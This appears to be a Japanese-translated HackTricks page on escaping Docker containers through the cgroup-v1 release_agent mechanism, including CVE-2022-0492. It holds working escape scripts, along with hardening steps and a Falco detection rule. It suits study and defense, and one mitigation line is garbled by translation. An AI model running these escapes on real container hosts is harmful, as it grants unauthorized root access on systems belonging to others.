# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**詳細については、** [**元のブログ投稿**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**を参照してください。** これは要約です：

---

## クラシック PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The PoCは**cgroup-v1**の`release_agent`機能を悪用します：`notify_on_release=1`のcgroupの最後のタスクが終了すると、カーネル（**ホストの初期名前空間内で**）は、書き込み可能なファイル`release_agent`に保存されているプログラムのパスを実行します。**ホスト上でフルルート権限で実行されるため**、ファイルへの書き込みアクセスを得ることができれば、コンテナの脱出が可能です。

### 短く読みやすい手順

1. **新しいcgroupを準備する**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # または –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **`release_agent`を攻撃者が制御するホスト上のスクリプトにポイントする**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **ペイロードをドロップする**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **通知をトリガーする**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # 自分自身を追加し、すぐに終了する
cat /output                                  # 現在ホストプロセスを含む
```

---

## 2022年のカーネル脆弱性 – CVE-2022-0492

2022年2月、Yiqi SunとKevin Wangは、**カーネルがcgroup-v1の`release_agent`に書き込む際に能力を検証しなかったことを発見しました**（関数`cgroup_release_agent_write`）。

実際には、**cgroup階層をマウントできる任意のプロセス（例：`unshare -UrC`を介して）は、*初期*ユーザー名前空間内で`CAP_SYS_ADMIN`なしに`release_agent`に任意のパスを書き込むことができました**。デフォルト設定のルート実行のDocker/Kubernetesコンテナでは、これにより以下が可能になりました：

* ホスト上でのルートへの権限昇格；↗
* コンテナが特権でない状態でのコンテナ脱出。

この欠陥は**CVE-2022-0492**（CVSS 7.8 / 高）として割り当てられ、次のカーネルリリース（およびそれ以降）で修正されました：

* 5.16.2、5.15.17、5.10.93、5.4.176、4.19.228、4.14.265、4.9.299。

パッチコミット：`1e85af15da28 "cgroup: Fix permission checking"`。

### コンテナ内の最小限のエクスプロイト
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
カーネルが脆弱な場合、*ホスト*からのbusyboxバイナリはフルルートで実行されます。

### ハードニングと緩和策

* **カーネルを更新する** (≥ バージョン以上)。パッチは現在、`release_agent`に書き込むために*初期*ユーザー名前空間で`CAP_SYS_ADMIN`を必要とします。
* **cgroup-v2を優先する** – 統一された階層は**`release_agent`機能を完全に削除し**、このクラスのエスケープを排除しました。
* **不要な特権のないユーザー名前空間を無効にする**ホストで：
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **必須アクセス制御**: `mount`、`openat`を`/sys/fs/cgroup/**/release_agent`で拒否するAppArmor/SELinuxポリシー、または`CAP_SYS_ADMIN`を削除することで、脆弱なカーネルでもこの技術を防ぎます。
* **読み取り専用バインドマスク**すべての`release_agent`ファイル（Palo Altoスクリプトの例）：
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## 実行時の検出

[`Falco`](https://falco.org/)はv0.32以降、組み込みルールを提供しています：
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
ルールは、`*/release_agent` への書き込み試行が、まだ `CAP_SYS_ADMIN` を持つコンテナ内のプロセスから行われた場合にトリガーされます。

## 参考文献

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – 詳細な分析と緩和スクリプト。
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
